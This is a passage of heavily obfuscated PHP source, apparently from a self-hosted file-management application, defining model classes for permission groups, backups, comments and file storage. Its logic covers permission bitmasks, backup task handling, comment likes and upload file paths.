$£ÚÏÒÃ’ =& $_SERVER[‚ûòÉ˜ş]; $Œí«® = parent::listData($†ğŸ¾ä); $à³İÜÑ³ = $this->findByName($÷¥ÒĞ´Ë[$£ÚÏÒÃ’[42]]); if (!$Œí«® || $à³İÜÑ³ && $à³İÜÑ³[$£ÚÏÒÃ’[451]] != $Œí«®[$£ÚÏÒÃ’[451]]) { return !1; } $this->filterAuth($÷¥ÒĞ´Ë[$£ÚÏÒÃ’[463]]); return parent::update($†ğŸ¾ä, $÷¥ÒĞ´Ë); } public function remove($ãØÁ‡) { $¨æÊ†¶Â = parent::listData($ãØÁ‡); if (!$¨æÊ†¶Â || $¨æÊ†¶Â[$_SERVER[‚ûòÉ˜ş][189]]) { return !1; } return parent::remove($ãØÁ‡); } public function add($©‘’°Ÿá = array()) { $—ĞñÃ–  =& $_SERVER[‚ûòÉ˜ş]; if ($this->findByName($©‘’°Ÿá[$—ĞñÃ– [42]])) { return !1; } $µÇòµÇ = array($—ĞñÃ– [42] => $—ĞñÃ– [12], $—ĞñÃ– [463] => 1, $—ĞñÃ– [1908] => $—ĞñÃ– [1895], $—ĞñÃ– [1907] => 1, $—ĞñÃ– [189] => 0, $—ĞñÃ– [1909] => 0); $©‘’°Ÿá = array_merge($µÇòµÇ, $©‘’°Ÿá); $©‘’°Ÿá[$—ĞñÃ– [1909]] = $this->getSort(); $this->filterAuth($©‘’°Ÿá[$—ĞñÃ– [463]]); return parent::insert($©‘’°Ÿá); } private function getSort() { $ê¾Òª¾“ =& $_SERVER[‚ûòÉ˜ş]; $³ßÀ‰îÏ = parent::listData(); $¯ªÔşÊ = array_to_keyvalue($³ßÀ‰îÏ, $ê¾Òª¾“[12], $ê¾Òª¾“[1909]); return empty($¯ªÔşÊ) ? 0 : max($¯ªÔşÊ) + 1; } private function filterAuth(&$¸ø‘°çˆ) { if (!$¸ø‘°çˆ) { return; } $ƒÆ‹œ‹  = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $İß»Úîâ = array(); foreach ($ƒÆ‹œ‹  as $¿ÍúòÀ€) { if ($¸ø‘°çˆ & $¿ÍúòÀ€) { $İß»Úîâ[] = $¿ÍúòÀ€; } } if (in_array(self::AUTH_ROOT, $İß»Úîâ)) { $¸ø‘°çˆ = array_sum($ƒÆ‹œ‹ ); return; } $ßúÍò… = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($İß»Úîâ as $¿ÍúòÀ€) { if (isset($ßúÍò…[$¿ÍúòÀ€])) { $İß»Úîâ = array_merge($İß»Úîâ, $ßúÍò…[$¿ÍúòÀ€]); } } $İß»Úîâ[] = self::AUTH_SHOW; $¸ø‘°çˆ = array_sum(array_unique($İß»Úîâ)); } public function sort($®ôÁªŞé, $ñ÷ò‹Ò÷) { return parent::update($®ôÁªŞé, $ñ÷ò‹Ò÷); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\142\x61\x63\153\165\160\x4c\x69\163\x74"; public $field = array("\x69\x6f", "\x6e\141\x6d\x65", "\x73\x74\x61\x74\x75\x73", "\x63\157\156\x74\145\x6e\164", "\x6d\141\x6e\165\141\154", "\x72\x65\x73\x75\154\164", "\x74\151\155\x65\106\x72\157\155", "\164\151\x6d\x65\x54\x6f"); public function config() { $¨‚Ô¾†’ =& $_SERVER[‚ûòÉ˜ş]; $ÚÚ–ó = Model($¨‚Ô¾†’[810])->get($¨‚Ô¾†’[820]); $ÚÚ–ó = json_decode($ÚÚ–ó, !0); $ÚÚ–ó = is_array($ÚÚ–ó) ? $ÚÚ–ó : array(); if (!isset($ÚÚ–ó[$¨‚Ô¾†’[794]])) { $ÚÚ–ó[$¨‚Ô¾†’[794]] = $¨‚Ô¾†’[98]; } unset($ÚÚ–ó[$¨‚Ô¾†’[1657]]); Action($¨‚Ô¾†’[1910])->taskInit(); Model($¨‚Ô¾†’[1656])->cacheClear(); $Ô­¢ˆÑì = $¨‚Ô¾†’[1911]; $‘‚Å³  = Model($¨‚Ô¾†’[1912])->findByKey($¨‚Ô¾†’[1675], $Ô­¢ˆÑì); if (!$‘‚Å³ ) { $‘‚Å³  = array(); } if (isset($‘‚Å³ [$¨‚Ô¾†’[204]])) { $‘‚Å³ [$¨‚Ô¾†’[204]] = json_decode($‘‚Å³ [$¨‚Ô¾†’[204]], !0); } if (isset($ÚÚ–ó[$¨‚Ô¾†’[204]])) { $‘‚Å³ [$¨‚Ô¾†’[204]][$¨‚Ô¾†’[1660]] = $ÚÚ–ó[$¨‚Ô¾†’[204]]; unset($ÚÚ–ó[$¨‚Ô¾†’[204]]); } return array_merge($‘‚Å³ , $ÚÚ–ó); } public function listData($Ë¥®íæá = false, $úÑóá˜Ğ = "\155\x6f\x64\151\x66\171\x54\x69\155\145", $„®±¼±å = false) { return parent::listData($Ë¥®íæá, $úÑóá˜Ğ, !0); } public function lastItem() { $Ìû”›ß¶ = $this->listData(); return !empty($Ìû”›ß¶[0]) ? $Ìû”›ß¶[0] : null; } public function kill($•ö“ÛÆ”) { $Ø•ÑÀË =& $_SERVER[‚ûòÉ˜ş]; $ä…Óò÷× = $this->listData($•ö“ÛÆ”); if (!$ä…Óò÷× || empty($ä…Óò÷×[$Ø•ÑÀË[42]])) { return !0; } Task::kill($Ø•ÑÀË[819]); Task::kill($Ø•ÑÀË[840]); Task::kill($Ø•ÑÀË[849]); $ğô¥Ëë = $ä…Óò÷×[$Ø•ÑÀË[42]]; $ı¢Ïâ£º = TEMP_FILES . $Ø•ÑÀË[818] . $ğô¥Ëë . $Ø•ÑÀË[8]; IO::remove($ı¢Ïâ£º, !1); return $this->remove($•ö“ÛÆ”); } public function remove($›ı•œ¸œ) { $³ùÅøÕ = $this->listData($›ı•œ¸œ); if (!$³ùÅøÕ) { return !0; } return $this->backupRemove($³ùÅøÕ); } private function backupRemove($ÃşğÉää) { parent::remove($ÃşğÉää[$_SERVER[‚ûòÉ˜ş][451]]); $ÉÔ¢òšÏ = $this->backupPath($ÃşğÉää); IO::remove($ÉÔ¢òšÏ, !1); return !0; } private function backupPath($‹ÒÚøˆÂ) { $’¶ÑæçÁ =& $_SERVER[‚ûòÉ˜ş]; $Â®À€Ÿ = $‹ÒÚøˆÂ[$’¶ÑæçÁ[42]]; $ÍŒî³‘ğ = Model($’¶ÑæçÁ[810])->get($’¶ÑæçÁ[811]); $¼ì·‘ïö = substr(md5($’¶ÑæçÁ[812] . $ÍŒî³‘ğ . $Â®À€Ÿ), 0, 8); return "\x7b\x69\x6f\72{$‹ÒÚøˆÂ[$’¶ÑæçÁ[791]]}\x7d\57\144\x61\164\141\142\141\x73\145\x2f\x62\x61\143\x6b\165\160\x2f" . $Â®À€Ÿ . $’¶ÑæçÁ[11] . $¼ì·‘ïö; } public function start() { $µí®»õ‘ =& $_SERVER[‚ûòÉ˜ş]; if ($GLOBALS[$µí®»õ‘[6]][$µí®»õ‘[99]][$µí®»õ‘[1913]] != $µí®»õ‘[98]) { return !0; } $õ®ŒïÒ = $this->config(); if (!$õ®ŒïÒ || $õ®ŒïÒ[$µí®»õ‘[1657]] != $µí®»õ‘[98]) { return !1; } $ÂË¬º¢† = $this->process(); foreach ($ÂË¬º¢† as $˜“ş»÷÷) { if ($˜“ş»÷÷) { return Task::restart($˜“ş»÷÷[$µí®»õ‘[451]]); } } $Ğ…Ñ¢ó = new Backup(); $ø™Ïœè‡ = $Ğ…Ñ¢ó->db(); if ($ø™Ïœè‡) { $ø™Ïœè‡ = $Ğ…Ñ¢ó->dbFile(); if ($ø™Ïœè‡ && $õ®ŒïÒ[$µí®»õ‘[794]] == $µí®»õ‘[222]) { $ø™Ïœè‡ = $Ğ…Ñ¢ó->file(); } } Backup::set(array($µí®»õ‘[790] => 1, $µí®»õ‘[801] => time())); return !0; } public function process() { $¸ùéè‚ =& $_SERVER[‚ûòÉ˜ş]; $±â³æ«ï = array($¸ùéè‚[797] => Task::get($¸ùéè‚[819]), $¸ùéè‚[802] => Task::get($¸ùéè‚[840]), $¸ùéè‚[224] => Task::get($¸ùéè‚[849])); $ƒ¶¢¥ = !1; foreach ($±â³æ«ï as &$µà¨É˜) { if ($ƒ¶¢¥) { $µà¨É˜ = !1; continue; } if ($µà¨É˜) { $Í’õ‰üÓ = intval(_get($µà¨É˜, $¸ùéè‚[1692], 0)); if (time() - $Í’õ‰üÓ > 7200) { Task::kill($µà¨É˜[$¸ùéè‚[451]]); $ƒ¶¢¥ = !0; $µà¨É˜ = !1; } } } return $±â³æ«ï; } public function restore() { $Êö±÷¹í =& $_SERVER[‚ûòÉ˜ş]; ActionCall($Êö±÷¹í[1101], !0, 1); ActionCall($Êö±÷¹í[1101], !0, 0); } } goto fò†á¯¹ó; fò†á¯¹ó: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\x65" => "\143\157\155\x6d\145\156\164\x5f\x6d\x65\x74\x61", "\x6d\145\164\x61\106\x69\x65\154\144" => "\143\x6f\155\x6d\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¶îøõÑæ) { $¤ü§Ø˜Ø =& $_SERVER[‚ûòÉ˜ş]; if ($¶îøõÑæ[$¤ü§Ø˜Ø[1914]]) { $ë‡°İ‚ = $this->where(array($¤ü§Ø˜Ø[1915] => $¶îøõÑæ[$¤ü§Ø˜Ø[1914]]))->find(); if (!$ë‡°İ‚ || $ë‡°İ‚[$¤ü§Ø˜Ø[188]] != $¶îøõÑæ[$¤ü§Ø˜Ø[188]] || $ë‡°İ‚[$¤ü§Ø˜Ø[546]] != $¶îøõÑæ[$¤ü§Ø˜Ø[546]]) { return !1; } $this->where(array($¤ü§Ø˜Ø[1915] => $¶îøõÑæ[$¤ü§Ø˜Ø[1914]]))->setAdd($¤ü§Ø˜Ø[1916], 1); } $¶îøõÑæ[$¤ü§Ø˜Ø[1917]] = 0; $¶îøõÑæ[$¤ü§Ø˜Ø[1916]] = 0; $¶îøõÑæ[$¤ü§Ø˜Ø[790]] = 1; return $this->add($¶îøõÑæ); } public function commentCount($œø±ä•ò, $Ïü¨…Û, $ÎÌú›Ãİ = false) { $Ï§±˜Õó =& $_SERVER[‚ûòÉ˜ş]; if (!$œø±ä•ò) { return array(); } if (is_string($œø±ä•ò) || is_int($œø±ä•ò)) { $œø±ä•ò = array($œø±ä•ò); } $ŠÜß±ƒ = array($Ï§±˜Õó[546], $Ï§±˜Õó[1918] => $Ï§±˜Õó[541]); $‚¡×®æ¬ = array($Ï§±˜Õó[546] => array($Ï§±˜Õó[7], $œø±ä•ò), $Ï§±˜Õó[188] => $Ïü¨…Û); if ($ÎÌú›Ãİ) { $‚¡×®æ¬[$Ï§±˜Õó[1687]] = $ÎÌú›Ãİ; } $¥ô˜€‰© = $this->field($ŠÜß±ƒ)->where($‚¡×®æ¬)->group($Ï§±˜Õó[546])->select(); return array_to_keyvalue($¥ô˜€‰©, $Ï§±˜Õó[546], $Ï§±˜Õó[541]); } public function starTarget($¿¶¹×, $Á†õ¸ê) { $‚ÀïÚ =& $_SERVER[‚ûòÉ˜ş]; $ßŒÀı› = $¿¶¹× + self::TYPE_STAR_OFFSET; $ıÂ¥Çç¨ = array($‚ÀïÚ[1687] => USER_ID, $‚ÀïÚ[188] => $ßŒÀı›, $‚ÀïÚ[546] => $Á†õ¸ê); $¼ºĞ„‰ = $this->where($ıÂ¥Çç¨)->find(); if ($¼ºĞ„‰) { return $this->where(array($‚ÀïÚ[451] => $¼ºĞ„‰[$‚ÀïÚ[451]]))->delete(); } $˜¦ÆûÅ» = array($‚ÀïÚ[1914] => 0, $‚ÀïÚ[1687] => USER_ID, $‚ÀïÚ[790] => 1, $‚ÀïÚ[794] => $‚ÀïÚ[12], $‚ÀïÚ[188] => $ßŒÀı›, $‚ÀïÚ[546] => $Á†õ¸ê, $‚ÀïÚ[1917] => 0, $‚ÀïÚ[1916] => 0); return $this->add($˜¦ÆûÅ»); } public function starTargetCount($¡â–à‹å, $ÎÀ¹½ÉÔ) { $·½éŒŒ¿ =& $_SERVER[‚ûòÉ˜ş]; $×Ò™İıâ = $ÎÀ¹½ÉÔ + self::TYPE_STAR_OFFSET; $ÄˆèÀœƒ = $this->commentCount($¡â–à‹å, $×Ò™İıâ); $¿¹«‰¿ = $this->commentCount($¡â–à‹å, $×Ò™İıâ, USER_ID); return array($·½éŒŒ¿[1919] => $ÄˆèÀœƒ, $·½éŒŒ¿[1920] => $¿¹«‰¿); } public function starTargetUserList($½ƒğå³’, $¸İôÑû) { $è¿³¨«ª =& $_SERVER[‚ûòÉ˜ş]; $Ÿ»ª‹ã½ = $½ƒğå³’ + self::TYPE_STAR_OFFSET; $§õ†‡“‰ = array($è¿³¨«ª[546] => $¸İôÑû, $è¿³¨«ª[188] => $Ÿ»ª‹ã½); $ŸàÊİø = $this->where($§õ†‡“‰)->count(); $©Â¤ØÉ = array($è¿³¨«ª[308] => $ŸàÊİø, $è¿³¨«ª[1921] => array()); if (!$ŸàÊİø) { return $©Â¤ØÉ; } $ˆàõ«×º = $this->field($è¿³¨«ª[1687])->where($§õ†‡“‰)->limit(500)->select(); $ˆàõ«×º = array_to_keyvalue($ˆàõ«×º, $è¿³¨«ª[12], $è¿³¨«ª[1687]); $©Â¤ØÉ[$è¿³¨«ª[1921]] = Model($è¿³¨«ª[554])->userListInfo($ˆàõ«×º); return $©Â¤ØÉ; } public function prasiseUserList($ó£ğŒ) { $´Ó¹·¥¾ =& $_SERVER[‚ûòÉ˜ş]; $›ÜÈÀª = array($´Ó¹·¥¾[1922] => $ó£ğŒ); $•âºú = $this->where($›ÜÈÀª)->find(); $‘Ó§ùüµ = _get($•âºú, $´Ó¹·¥¾[1917], 0); $Éòéñ÷ = array($´Ó¹·¥¾[308] => $‘Ó§ùüµ, $´Ó¹·¥¾[1921] => array()); if (!$‘Ó§ùüµ) { return $Éòéñ÷; } $òŒöôÉê = Model($´Ó¹·¥¾[1923])->field($´Ó¹·¥¾[1687])->where($›ÜÈÀª)->limit(500)->select(); $òŒöôÉê = array_to_keyvalue($òŒöôÉê, $´Ó¹·¥¾[12], $´Ó¹·¥¾[1687]); $Éòéñ÷[$´Ó¹·¥¾[1921]] = Model($´Ó¹·¥¾[554])->userListInfo($òŒöôÉê); return $Éòéñ÷; } public function remove($¼¬æ‚÷) { $èÙµ¡°ù =& $_SERVER[‚ûòÉ˜ş]; $—¹éŸĞı = array($èÙµ¡°ù[1915] => $¼¬æ‚÷); $±ıšÛ¦ = $this->where($—¹éŸĞı)->find(); if ($±ıšÛ¦[$èÙµ¡°ù[1914]]) { $this->where(array($èÙµ¡°ù[1915] => $±ıšÛ¦[$èÙµ¡°ù[1914]]))->setAdd($èÙµ¡°ù[1916], -1); } return $this->where($—¹éŸĞı)->delete(); } public function edit($Ûò‹èûÍ, $ÏâÓö÷ô) { $£¬­‹ø§ =& $_SERVER[‚ûòÉ˜ş]; $øÖäóó¥ = array($£¬­‹ø§[1915] => $Ûò‹èûÍ); return $this->where($øÖäóó¥)->save(array($£¬­‹ø§[1924] => $ÏâÓö÷ô)); } public function prasise($Ù”Ü¥›£) { $¬›Õ¶ùş =& $_SERVER[‚ûòÉ˜ş]; $ûÁœ‡Ö’ = Model($¬›Õ¶ùş[1925]); $­ù£›ğ¦ = array($¬›Õ¶ùş[1915] => $Ù”Ü¥›£, $¬›Õ¶ùş[1678] => USER_ID); $ì­Ûú” = $ûÁœ‡Ö’->where($­ù£›ğ¦)->find(); if (!$ì­Ûú”) { $ûÁœ‡Ö’->add($­ù£›ğ¦); $ÜÏı¯ = $this->where(array($¬›Õ¶ùş[1915] => $Ù”Ü¥›£))->setAdd($¬›Õ¶ùş[1917], 1); } else { $ûÁœ‡Ö’->where($­ù£›ğ¦)->delete(); $ÜÏı¯ = $this->where(array($¬›Õ¶ùş[1915] => $Ù”Ü¥›£))->setAdd($¬›Õ¶ùş[1917], -1); } return $ÜÏı¯; } public function targetInfo($ôÄğ»¼, $›ş€Ê§Ó) { $¸“äº¶Á =& $_SERVER[‚ûòÉ˜ş]; $èìåóèº = array($¸“äº¶Á[624] => $ôÄğ»¼, $¸“äº¶Á[625] => $›ş€Ê§Ó); $¨€èÊîı = $this->where($èìåóèº)->count(); $„±¬˜¿ş = "\x52\x49\107\110\124\x20\112\117\111\116\40{$this->tablePrefix}\143\x6f\155\x6d\x65\156\164\137\160\x72\141\151\163\145\x20\x73\164\141\x72\x20\x6f\x6e\x20\143\157\x6d\x6d\145\156\164\56\x63\157\x6d\x6d\x65\156\164\x49\104\x20\75\40\x73\x74\x61\162\56\143\157\155\155\145\156\x74\x49\104"; $Á¸‘£¢ù = $this->alias($¸“äº¶Á[407])->where($èìåóèº)->join($„±¬˜¿ş, $¸“äº¶Á[1926])->count(); $©ìäêÕ… = array($¸“äº¶Á[1927] => $¨€èÊîı, $¸“äº¶Á[1928] => $Á¸‘£¢ù); return $©ìäêÕ…; } public function listData($ÄŸº¹±Ä) { $ò½Šˆ =& $_SERVER[‚ûòÉ˜ş]; if (isset($ÄŸº¹±Ä[$ò½Šˆ[1929]])) { if ($ÄŸº¹±Ä[$ò½Šˆ[1929]]) { $ÄŸº¹±Ä[$ò½Šˆ[1922]] = array($ò½Šˆ[1055], intval($ÄŸº¹±Ä[$ò½Šˆ[1929]])); } unset($ÄŸº¹±Ä[$ò½Šˆ[1929]]); } if (isset($ÄŸº¹±Ä[$ò½Šˆ[1930]])) { if ($ÄŸº¹±Ä[$ò½Šˆ[1930]]) { $ÄŸº¹±Ä[$ò½Šˆ[1922]] = array($ò½Šˆ[1052], intval($ÄŸº¹±Ä[$ò½Šˆ[1930]])); } unset($ÄŸº¹±Ä[$ò½Šˆ[1930]]); } return $this->_listData($ÄŸº¹±Ä); } private function _listData($„¦£·ñş) { $Šíãñìû =& $_SERVER[‚ûòÉ˜ş]; $ì’Æúø = $this->where($„¦£·ñş)->_makeOrder()->selectPage(100); $this->_listAppendParent($ì’Æúø[$Šíãñìû[422]]); $this->_listAppendUser($ì’Æúø[$Šíãñìû[422]]); $this->_listAppendMeta($ì’Æúø[$Šíãñìû[422]]); return $ì’Æúø; } private function _makeOrder() { $˜Æ…ò™ =& $_SERVER[‚ûòÉ˜ş]; $¼Ã·Šú = array($˜Æ…ò™[1917], $˜Æ…ò™[1916], $˜Æ…ò™[225]); $ìûèæ‰Ü = Input::get($˜Æ…ò™[506], $˜Æ…ò™[7], $˜Æ…ò™[473], $¼Ã·Šú); $¸»¾òÅá = Input::get($˜Æ…ò™[507], $˜Æ…ò™[7], $˜Æ…ò™[1680], array($˜Æ…ò™[1931], $˜Æ…ò™[502])); $†›Î«Ç = $ìûèæ‰Ü . $˜Æ…ò™[63] . $¸»¾òÅá; return $this->order($†›Î«Ç); } private function _listAppendParent(&$×«Àôâ) { $ôÂÛÌÑ =& $_SERVER[‚ûòÉ˜ş]; $×İ÷”…Ì = array_unique(array_to_keyvalue($×«Àôâ, $ôÂÛÌÑ[12], $ôÂÛÌÑ[1914])); $×İ÷”…Ì = array_remove_value($×İ÷”…Ì, $ôÂÛÌÑ[222]); if (!$×İ÷”…Ì) { return; } $¦çáç‘ = $this->where(array($ôÂÛÌÑ[1915] => array($ôÂÛÌÑ[7], $×İ÷”…Ì)))->select(); $¦çáç‘ = array_to_keyvalue($¦çáç‘, $ôÂÛÌÑ[1922]); foreach ($×«Àôâ as &$¹÷²æ¥) { if (isset($¦çáç‘[$¹÷²æ¥[$ôÂÛÌÑ[1914]]])) { $¹÷²æ¥[$ôÂÛÌÑ[1932]] = $¦çáç‘[$¹÷²æ¥[$ôÂÛÌÑ[1914]]]; } } unset($¹÷²æ¥); } private function _listAppendUser(&$ôÙ„ºØ±) { $ôâÛµÓÄ =& $_SERVER[‚ûòÉ˜ş]; $Àµ–‹µ¤ = array_unique(array_to_keyvalue($ôÙ„ºØ±, $ôâÛµÓÄ[12], $ôâÛµÓÄ[1687])); $Àµ–‹µ¤ = array_remove_value($Àµ–‹µ¤, $ôâÛµÓÄ[222]); if (count($Àµ–‹µ¤) == 0) { return; } foreach ($ôÙ„ºØ± as $›¡³“·) { if (isset($›¡³“·[$ôâÛµÓÄ[1932]])) { $Àµ–‹µ¤[] = $›¡³“·[$ôâÛµÓÄ[1932]][$ôâÛµÓÄ[1687]]; } } $×ÍÊè = Model($ôâÛµÓÄ[575])->userListInfo($Àµ–‹µ¤); foreach ($ôÙ„ºØ± as &$›¡³“·) { $›¡³“·[$ôâÛµÓÄ[638]] = $×ÍÊè[$›¡³“·[$ôâÛµÓÄ[1687]]]; if (isset($›¡³“·[$ôâÛµÓÄ[1932]])) { $›¡³“·[$ôâÛµÓÄ[1932]][$ôâÛµÓÄ[638]] = $×ÍÊè[$›¡³“·[$ôâÛµÓÄ[1932]][$ôâÛµÓÄ[1687]]]; } } unset($›¡³“·); } private function _listAppendMeta(&$Í¦¹ª®†) { $ô¹èê‰Ÿ =& $_SERVER[‚ûòÉ˜ş]; $¬›îˆ¶¥ = array_unique(array_to_keyvalue($Í¦¹ª®†, $ô¹èê‰Ÿ[12], $ô¹èê‰Ÿ[1922])); $¬›îˆ¶¥ = array_remove_value($¬›îˆ¶¥, $ô¹èê‰Ÿ[222]); if (!$¬›îˆ¶¥) { return; } foreach ($Í¦¹ª®† as $æ£Š…Ç) { if (isset($æ£Š…Ç[$ô¹èê‰Ÿ[1932]])) { $¬›îˆ¶¥[] = $æ£Š…Ç[$ô¹èê‰Ÿ[1932]][$ô¹èê‰Ÿ[1922]]; } } $ûîé¼èø = $this->metaList($¬›îˆ¶¥); if (!$ûîé¼èø) { return !1; } foreach ($Í¦¹ª®† as &$æ£Š…Ç) { $æ£Š…Ç[$ô¹èê‰Ÿ[515]] = $ûîé¼èø[$æ£Š…Ç[$ô¹èê‰Ÿ[1922]]]; if (isset($æ£Š…Ç[$ô¹èê‰Ÿ[1932]])) { $æ£Š…Ç[$ô¹èê‰Ÿ[1932]][$ô¹èê‰Ÿ[515]] = $ûîé¼èø[$æ£Š…Ç[$ô¹èê‰Ÿ[1932]][$ô¹èê‰Ÿ[1922]]]; } } unset($æ£Š…Ç); } private function metaList($åÁ¯ ª) { $ã½°…à =& $_SERVER[‚ûòÉ˜ş]; if (!$åÁ¯ ª) { return array(); } $”§ÑÛ = array($ã½°…à[1922] => array($ã½°…à[7], $åÁ¯ ª)); $Ó‘’¬…¥ = Model($ã½°…à[1933])->where($”§ÑÛ)->select(); $Ó‘’¬…¥ = array_to_keyvalue_group($Ó‘’¬…¥, $ã½°…à[1922]); foreach ($Ó‘’¬…¥ as $È«²ÓÍ½ => $…¾‘Ó‚«) { $ôËÎ¦¥î = array(); foreach ($…¾‘Ó‚« as $›œğäÖ) { $ôËÎ¦¥î[$›œğäÖ[$ã½°…à[104]]] = $›œğäÖ[$ã½°…à[427]]; } $Ó‘’¬…¥[$È«²ÓÍ½] = $ôËÎ¦¥î; } return $Ó‘’¬…¥ ? $Ó‘’¬…¥ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\151\154\145\137\x63\x6f\x6e\164\145\156\x74\x73"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\x69\x6d\x65", "\x74\x69\155\145", "\151\156\163\x65\x72\164", "\x66\x75\x6e\143\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\155\x65" => "\151\157\137\x66\x69\154\145\x5f\x6d\x65\164\x61", "\x6d\x65\164\x61\x46\151\145\154\144" => "\x66\x69\154\x65\x49\x44"); public function fileInfo($„€´±¾®) { $íÚïÅªÉ =& $_SERVER[‚ûòÉ˜ş]; static $Ï„à¿ø = array(); if (!isset($Ï„à¿ø[$„€´±¾®])) { $ˆµÏ¹Ğ¨ = $íÚïÅªÉ[1934]; $ö»É¾Ğ = Model($íÚïÅªÉ[520])->field($ˆµÏ¹Ğ¨)->where(array($íÚïÅªÉ[518] => $„€´±¾®))->find(); $Ï„à¿ø[$„€´±¾®] = $ö»É¾Ğ; } return $Ï„à¿ø[$„€´±¾®]; } public function addFileByContent($æÓŒ¤‚Ş = '', $öúÛÂ©è = '') { $ÓÏ“°§´ =& $_SERVER[‚ûòÉ˜ş]; $Ÿøä†Üï = TEMP_PATH . $ÓÏ“°§´[1935]; if (!is_dir($Ÿøä†Üï)) { mk_dir($Ÿøä†Üï); } $ÓÅğ°Ú’ = $Ÿøä†Üï . $ÓÏ“°§´[1936] . rand_string(16); file_put_contents($ÓÅğ°Ú’, $æÓŒ¤‚Ş); $î»©ÒÉ = $this->addFile($ÓÅğ°Ú’, $öúÛÂ©è, !0); if (file_exists($ÓÅğ°Ú’)) { @unlink($ÓÅğ°Ú’); } return $î»©ÒÉ; } public function createFileName($ß¼ïù½˜, $‚†ëÏí = false, $ØÑ±ñïù = false) { $è¤ŒÍıì =& $_SERVER[‚ûòÉ˜ş]; $ÌßøäšÚ = IO::init($è¤ŒÍıì[8]); $ò¯ŒËìª = $this->makeFilePath($ß¼ïù½˜, $ÌßøäšÚ, $‚†ëÏí, $ØÑ±ñïù); $Ã„ü–È¨ = $ÌßøäšÚ->pathFather($ò¯ŒËìª); static $ô„¶—×½ = false; $›Íæé„ = $è¤ŒÍıì[1937] . md5($Ã„ü–È¨); if (!$ô„¶—×½ && !Cache::get($›Íæé„)) { $ô„¶—×½ = !0; $ôÉ– ÷³ = IO::mkdir($Ã„ü–È¨); if (!IO::exist($ôÉ– ÷³ . $è¤ŒÍıì[837])) { IO::mkfile($ôÉ– ÷³ . $è¤ŒÍıì[837]); } Cache::set($›Íæé„, 1, 3600 * 2); } return $ò¯ŒËìª; } public function makeFilePath($§ƒ©Ë…Ü, $€Ï­±¨Æ, $×‘ İÏ‘ = false, $ï”ëµæ = false) { $·Õ”ËÏƒ =& $_SERVER[‚ûòÉ˜ş]; $í¡ £ŞÔ = Model($·Õ”ËÏƒ[810])->get($·Õ”ËÏƒ[1938]); $—âÏµ”Â = KodIO::defaultIO() . date($·Õ”ËÏƒ[1939]); $èô­òÚ€ = $—âÏµ”Â . rand_string(5) . short_id(100); $§ƒ©Ë…Ü = str_replace($·Õ”ËÏƒ[8], $·Õ”ËÏƒ[11], KodIO::clear($§ƒ©Ë…Ü)); $¦øæÇ‚Ù = $€Ï­±¨Æ->ext($§ƒ©Ë…Ü); if (!$§ƒ©Ë…Ü) { $í¡ £ŞÔ = $·Õ”ËÏƒ[1940]; } switch ($í¡ £ŞÔ) { case $·Õ”ËÏƒ[1941]: $èô­òÚ€ = $èô­òÚ€ . $·Õ”ËÏƒ[10] . $€Ï­±¨Æ->ext($§ƒ©Ë…Ü); if ($¦øæÇ‚Ù == $·Õ”ËÏƒ[1878]) { $èô­òÚ€ .= $·Õ”ËÏƒ[1247]; } break; case $·Õ”ËÏƒ[1942]: $Ñ¡ëÓË÷ = Model($·Õ”ËÏƒ[810])->get($·Õ”ËÏƒ[811]); $ÀŠ“–Ù¸ = substr(md5($·Õ”ËÏƒ[812] . $Ñ¡ëÓË÷ . date($·Õ”ËÏƒ[788])), 0, 8); $İÆÂ’¨Ü = KodIO::defaultDriver(); $—âÏµ”Â = $·Õ”ËÏƒ[1278] . $İÆÂ’¨Ü[$·Õ”ËÏƒ[451]] . $·Õ”ËÏƒ[460] . date($·Õ”ËÏƒ[1943]) . $ÀŠ“–Ù¸ . $·Õ”ËÏƒ[8]; if ($¦øæÇ‚Ù == $·Õ”ËÏƒ[1878]) { $§ƒ©Ë…Ü .= $·Õ”ËÏƒ[1247]; } $Ã®†Œ´¾ = $·Õ”ËÏƒ[1944] . $—âÏµ”Â . $§ƒ©Ë…Ü; CacheLock::lock($Ã®†Œ´¾); $èô­òÚ€ = $—âÏµ”Â . $§ƒ©Ë…Ü; if (IO::exist($—âÏµ”Â . $§ƒ©Ë…Ü)) { $¹¡­ÃÁ = substr($§ƒ©Ë…Ü, 0, strlen($§ƒ©Ë…Ü) - strlen($¦øæÇ‚Ù)); $óü×ïÏˆ = $ï”ëµæ ? substr($ï”ëµæ, 0, 5) : ($×‘ İÏ‘ ? substr($×‘ İÏ‘, 0, 5) : rand_string(5)); $èô­òÚ€ = $—âÏµ”Â . $¹¡­ÃÁ . $óü×ïÏˆ . $·Õ”ËÏƒ[10] . $¦øæÇ‚Ù; } if (IO::isTypeObject($èô­òÚ€) && !IO::isUploadServer($èô­òÚ€)) { if (IO::exist($èô­òÚ€)) { return $èô­òÚ€; } $Èà–ÙšØ = IO::setContent($èô­òÚ€, $·Õ”ËÏƒ[12]); if (!$Èà–ÙšØ) { show_json($·Õ”ËÏƒ[1945], !1); } } CacheLock::unlock($Ã®†Œ´¾); break; case $·Õ”ËÏƒ[1940]: break; default: break; } return $èô­òÚ€; } public function addFileByRemote($º±¥¨İÊ, $’°¸îÃ, $¾³öì¢ = array()) { $–Ô˜×¼¶ =& 